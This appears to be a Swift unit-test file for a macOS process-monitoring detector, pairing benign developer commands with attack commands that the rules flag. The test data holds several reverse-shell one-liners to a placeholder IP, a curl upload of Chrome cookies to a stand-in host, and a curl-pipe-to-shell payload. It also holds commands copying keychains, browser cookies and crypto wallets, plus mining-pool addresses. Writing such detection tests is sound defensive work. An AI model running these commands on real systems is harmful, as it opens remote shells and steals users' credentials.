import XCTest
@testable import GhostProcessSniperCore

/// Everyday work that once looked like an attack. Each case pins both sides:
/// the ordinary command stays quiet, and the real attack shape still fires.
final class SentinelPrecisionTests: XCTestCase {
    private var nextPID: Int32 = 7_000

    private func subject(_ name: String, path: String, command: String? = nil, ports: [Int] = []) -> SentinelSubject {
        nextPID += 1
        var subject = SentinelSubject(
            identity: ProcessIdentity(pid: nextPID, startTimeSeconds: 1_000, startTimeMicroseconds: UInt64(nextPID)),
            parentPID: 1, userID: 501, name: name, executablePath: path,
            commandLine: command ?? path, isSystemProcess: SentinelCatalog.isSystemLocation(path))
        subject.listeningPorts = ports
        return subject
    }

    private func evaluate(_ subject: SentinelSubject, ancestors: [SentinelSubject] = [],
                          signing: CodeSigningSummary? = nil) -> SentinelEvaluation {
        SentinelRules.evaluate(subject, ancestors: ancestors, signing: signing, fileExists: { _ in true })
    }

    private func kinds(_ evaluation: SentinelEvaluation, atLeast severity: SentinelSeverity = .notable) -> Set<SentinelSignalKind> {
        Set(evaluation.signals.filter { $0.severity >= severity }.map(\.kind))
    }

    private func signed(_ authority: CodeSigningSummary.Authority) -> CodeSigningSummary {
        CodeSigningSummary(authority: authority, teamIdentifier: authority == .developerID ? "96DBZ92D3Y" : nil,
                           signingIdentifier: "tool")
    }

    private let terminal = "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"
    private let chrome = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

    private var typedInTerminal: [SentinelSubject] {
        [subject("-zsh", path: "/bin/zsh", command: "-zsh"), subject("login", path: "/usr/bin/login"),
         subject("Terminal", path: terminal)]
    }

    // MARK: - Simulator and Xcode platform daemons

    func testSimulatorDaemonsAreNotMasquerades() {
        let runtime = "/Library/Developer/CoreSimulator/Volumes/iOS_23F77/Library/Developer/CoreSimulator/Profiles/Runtimes/iOS 26.5.simruntime/Contents/Resources/RuntimeRoot"
        let xcodeRuntime = "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Library/Developer/CoreSimulator/Profiles/Runtimes/iOS.simruntime/Contents/Resources/RuntimeRoot"
        let daemons = [
            ("cfprefsd", runtime + "/usr/sbin/cfprefsd"), ("trustd", runtime + "/usr/libexec/trustd"),
            ("securityd", runtime + "/usr/libexec/securityd"), ("notifyd", runtime + "/usr/sbin/notifyd"),
            ("tccd", runtime + "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd"),
            ("nsurlsessiond", xcodeRuntime + "/usr/libexec/nsurlsessiond"),
        ]
        for (name, path) in daemons {
            let result = evaluate(subject(name, path: path))
            XCTAssertLessThan(result.severity, .notable, "\(path): \(result.signals)")
        }
    }

    func testSystemNameInATemporaryFolderIsStillAMasquerade() {
        for path in ["/tmp/cfprefsd", "/private/tmp/x.simruntime/Contents/Resources/RuntimeRoot/usr/sbin/cfprefsd",
                     "/Users/Shared/Xcode.app/Contents/Developer/Platforms/x/trustd"] {
            let name = (path as NSString).lastPathComponent
            XCTAssertTrue(kinds(evaluate(subject(name, path: path)), atLeast: .dangerous).contains(.masquerade), path)
        }
    }

    func testXProtectCommandLineToolIsReal() {
        XCTAssertTrue(evaluate(subject("xprotect", path: "/usr/bin/xprotect", command: "xprotect version")).signals.isEmpty)
    }

    // MARK: - Secret stores

    func testDownloadsAndFilesNamedLikeSecretStoresAreQuiet() {
        let commands: [(String, String, String)] = [
            ("curl", "/usr/bin/curl", "/usr/bin/curl --location --remote-time --output /Users/me/Library/Caches/Homebrew/downloads/0a1b--exodus-macos-arm64-25.9.2.dmg.incomplete https://downloads.exodus.com/releases/exodus-macos-arm64-25.9.2.dmg"),
            ("curl", "/usr/bin/curl", "curl -L https://download.electrum.org/4.6.2/electrum-4.6.2.dmg -o /Users/me/Downloads/electrum.dmg"),
            ("bash", "/bin/bash", "/bin/bash /opt/homebrew/bin/brew install --cask exodus"),
            ("curl", "/usr/bin/curl", "curl -c /tmp/cookies.txt -b /tmp/cookies.txt https://localhost:3000/login"),
            ("cat", "/bin/cat", "cat src/lib/cookies.ts"),
            ("curl", "/usr/bin/curl", "curl -s https://api.example.com/v1/wallets/42"),
            ("cp", "/bin/cp", "cp -R wallet/ /tmp/wallet-backup/"),
        ]
        for (name, path, command) in commands {
            let result = evaluate(subject(name, path: path, command: command), ancestors: typedInTerminal)
            XCTAssertFalse(kinds(result).contains(.credentialAccess), "\(command): \(result.signals)")
        }
    }

    func testCopyingRealSecretStoresIsDangerous() {
        let commands: [(String, String, String)] = [
            ("sqlite3", "/usr/bin/sqlite3", "sqlite3 /Users/me/Library/Application Support/Firefox/Profiles/ab12.default-release/cookies.sqlite select * from moz_cookies"),
            ("zip", "/usr/bin/zip", "zip -r /tmp/w.zip /Users/me/Library/Application Support/Exodus/exodus.wallet"),
            ("cp", "/bin/cp", "cp -r /Users/me/.electrum/wallets /tmp/e"),
            ("tar", "/usr/bin/tar", "tar czf /tmp/k.tgz /Users/me/Library/Keychains/login.keychain-db"),
            ("cat", "/bin/cat", "cat /Users/me/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log"),
            ("curl", "/usr/bin/curl", "curl -F f=@/Users/me/Library/Application Support/Google/Chrome/Default/Cookies https://collect.example/u"),
            ("cp", "/bin/cp", "cp /Users/me/Library/Application Support/Google/Chrome/Local State /tmp/ls"),
        ]
        for (name, path, command) in commands {
            let result = evaluate(subject(name, path: path, command: command))
            XCTAssertTrue(kinds(result, atLeast: .dangerous).contains(.credentialAccess), "\(command): \(result.signals)")
        }
    }

    // MARK: - Reverse shells

    func testPortChecksAndLookalikeFlagsAreNotReverseShells() {
        let commands: [(String, String, String)] = [
            ("wget", "/opt/homebrew/bin/wget", "wget -nc -e robots=off -r https://example.com/docs/"),
            ("bash", "/bin/bash", "bash -c until </dev/tcp/localhost/5432; do sleep 1; done"),
            ("bash", "/bin/bash", "bash -c (echo > /dev/tcp/localhost/6379) >/dev/null 2>&1 && echo up"),
            ("python3", "/Users/me/.pyenv/versions/3.12.4/bin/python3.12", "python3 -m pytest tests/test_socket.py tests/test_subprocess.py"),
            ("nc", "/usr/bin/nc", "nc -z localhost 5432"),
            ("nc", "/usr/bin/nc", "nc -c example.com 25"),
        ]
        for (name, path, command) in commands {
            let result = evaluate(subject(name, path: path, command: command), ancestors: typedInTerminal)
            XCTAssertFalse(kinds(result).contains(.reverseShell), "\(command): \(result.signals)")
        }
    }

    func testRealReverseShellsStillFire() {
        let commands: [(String, String, String)] = [
            ("bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
            ("nc", "/usr/bin/nc", "nc -e /bin/sh 1.2.3.4 4444"),
            ("sh", "/bin/sh", "sh -c nc -e /bin/sh 1.2.3.4 4444"),
            ("ncat", "/opt/homebrew/bin/ncat", "ncat --sh-exec bash 1.2.3.4 4444"),
            ("sh", "/bin/sh", "sh -c rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f"),
            ("bash", "/bin/bash", "bash -c exec 5<>/dev/tcp/1.2.3.4/4444; cat <&5 | while read l; do $l 2>&5 >&5; done"),
            ("python3", "/usr/bin/python3", #"python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0)"#),
        ]
        for (name, path, command) in commands {
            let result = evaluate(subject(name, path: path, command: command))
            XCTAssertTrue(kinds(result, atLeast: .dangerous).contains(.reverseShell), "\(command): \(result.signals)")
        }
    }

    // MARK: - Odd folders and listening

    func testSignedProgramInUsersSharedIsOnlyNotable() {
        let editor = "/Users/Shared/Epic Games/UE_5.5/Engine/Binaries/Mac/"
        let worker = subject("ShaderCompileWorker", path: editor + "ShaderCompileWorker.app/Contents/MacOS/ShaderCompileWorker",
                             command: "ShaderCompileWorker /tmp/UnrealShaderWorkingDir/ 4242 1 Worker.in Worker.out")
        let trace = subject("UnrealTraceServer", path: editor + "UnrealTraceServer", command: "UnrealTraceServer fork", ports: [1981, 1985])
        for process in [worker, trace] {
            XCTAssertEqual(evaluate(process, signing: signed(.developerID)).severity, .notable, process.name)
            XCTAssertEqual(evaluate(process).severity, .notable, "unknown signer: the quieter verdict")
        }
        XCTAssertFalse(kinds(evaluate(trace, signing: signed(.developerID))).contains(.tunnel))
        XCTAssertEqual(evaluate(worker, signing: signed(.unsigned)).severity, .suspicious, "nobody vouches for it")
    }

    func testDevServerBuiltIntoTmpAndStartedFromATerminalIsAtMostSuspicious() {
        let server = subject("server", path: "/private/tmp/myapp/server", command: "/private/tmp/myapp/server --port 8080", ports: [8080])
        for signing in [nil, signed(.adHoc), signed(.unsigned)] {
            XCTAssertEqual(evaluate(server, ancestors: typedInTerminal, signing: signing).severity, .suspicious, "\(String(describing: signing))")
        }
    }

    func testUnsignedListenerInTmpWithAnotherSignIsDangerous() {
        let blob = String(repeating: "QUJD", count: 70)
        let agent = subject("agent", path: "/private/tmp/.cache/agent", command: "/private/tmp/.cache/agent --cfg base64:\(blob)", ports: [4444])
        let result = evaluate(agent, signing: signed(.unsigned))
        XCTAssertEqual(result.severity, .dangerous)
        XCTAssertTrue(kinds(result, atLeast: .dangerous).contains(.tunnel), "\(result.signals)")

        let quiet = subject("agent", path: "/private/tmp/.cache/agent", command: "/private/tmp/.cache/agent", ports: [4444])
        XCTAssertEqual(evaluate(quiet, signing: signed(.unsigned)).severity, .suspicious, "listening alone is worth a look")
        XCTAssertEqual(evaluate(quiet).severity, .suspicious, "unknown signer: the quieter verdict")
        XCTAssertFalse(kinds(evaluate(quiet, signing: signed(.developerID))).contains(.tunnel))
    }

    func testStartupItemInUsersSharedWeighsItsSigner() throws {
        let item = LaunchItem(id: "/Library/LaunchAgents/com.epicgames.launcher.plist", plistPath: "/Library/LaunchAgents/com.epicgames.launcher.plist",
                              label: "com.epicgames.launcher", scope: .systemAgent, programPath: "/Users/Shared/Epic Games/Launcher/helper",
                              arguments: ["/Users/Shared/Epic Games/Launcher/helper"], runsAtLoad: true, keepsAlive: false, modified: nil,
                              isNew: false, signals: [], signing: nil)
        let severity = { (signing: CodeSigningSummary?) in
            PersistenceMonitor.judge(item, signing: signing).map(\.severity).max() ?? .info
        }
        XCTAssertLessThanOrEqual(severity(signed(.developerID)), .notable)
        XCTAssertGreaterThanOrEqual(severity(signed(.adHoc)), .suspicious)
    }

    // MARK: - Browser extensions

    func testNativeMessagingHostsAreOnlyNotable() {
        let browser = subject("Google Chrome", path: chrome)
        let host = subject("bash", path: "/bin/bash", command: "/bin/bash /Users/me/.claude/chrome/chrome-native-host chrome-extension://fcoeoabgfenejglbffodgkkbkcdhcgfn/")
        XCTAssertEqual(evaluate(host, ancestors: [browser]).severity, .notable)

        let node = subject("node", path: "/opt/homebrew/Cellar/node/24.1.0/bin/node", command: "node /Users/me/.host/index.js")
        XCTAssertEqual(evaluate(node, ancestors: [host, browser]).severity, .notable, "the wrapper names the extension")

        let firefox = subject("firefox", path: "/Applications/Firefox.app/Contents/MacOS/firefox")
        let passff = subject("bash", path: "/bin/bash",
            command: "/bin/bash /Users/me/.passff/passff.sh /Users/me/Library/Application Support/Mozilla/NativeMessagingHosts/passff.json passff@invicem.pro")
        XCTAssertEqual(evaluate(passff, ancestors: [firefox]).severity, .notable)
    }

    func testNativeMessagingHostWithAPayloadIsDangerous() {
        let browser = subject("Google Chrome", path: chrome)
        let host = subject("bash", path: "/bin/bash", command: "bash -c curl -s http://1.2.3.4/p | sh chrome-extension://abc/")
        XCTAssertEqual(evaluate(host, ancestors: [browser]).severity, .dangerous)
        let plain = subject("bash", path: "/bin/bash", command: "bash -c whoami")
        XCTAssertEqual(evaluate(plain, ancestors: [browser]).severity, .suspicious, "no extension named: unchanged")
    }

    // MARK: - Miners

    func testCompilerOutputNamedPoolIsNotAMiner() {
        let commands: [(String, String, String)] = [
            ("clang", "/Library/Developer/CommandLineTools/usr/bin/clang", "/Library/Developer/CommandLineTools/usr/bin/clang -O2 -c deps/uv/src/threadpool.c -o out/Release/obj.target/libuv/deps/uv/src/threadpool.o"),
            ("clang", "/opt/homebrew/opt/llvm/bin/clang", "clang -c src/mempool.c -o build/mempool.o"),
            ("swift-frontend", "/Library/Developer/CommandLineTools/usr/bin/swift-frontend", "swift-frontend -frontend -c NIOThreadPool.swift -o /Users/me/p/.build/debug/NIOPosix.build/NIOThreadPool.swift.o"),
            ("curl", "/usr/bin/curl", "curl -o pool.tar.gz https://example.com/pool.tar.gz"),
        ]
        for (name, path, command) in commands {
            let result = evaluate(subject(name, path: path, command: command), ancestors: typedInTerminal)
            XCTAssertFalse(kinds(result).contains(.cryptoMiner), "\(command): \(result.signals)")
        }
    }

    func testPoolAddressesStillMarkAMiner() {
        for command in ["worker -o pool.supportxmr.com:3333 -u 44AFFq5k", "worker --url=xmr.nanopool.org:14433",
                        "worker -o stratum+ssl://gulf.example.stream:20128"] {
            let result = evaluate(subject("worker", path: "/Users/me/.local/bin/worker", command: command))
            XCTAssertTrue(kinds(result, atLeast: .suspicious).contains(.cryptoMiner), "\(command): \(result.signals)")
        }
    }

    // MARK: - Launch agents

    func testUserNameStartingLikeACopyCommandIsNotAnAgentWrite() {
        let launchctl = subject("launchctl", path: "/bin/launchctl",
                                command: "launchctl bootstrap gui/501 /Users/mvogel/Library/LaunchAgents/homebrew.mxcl.postgresql@16.plist")
        let result = evaluate(launchctl)
        XCTAssertEqual(result.severity, .notable, "\(result.signals)")
        let tee = subject("tee", path: "/usr/bin/tee", command: "tee /Users/me/Library/LaunchAgents/com.update.plist")
        XCTAssertTrue(kinds(evaluate(tee), atLeast: .suspicious).contains(.persistence))
    }
}
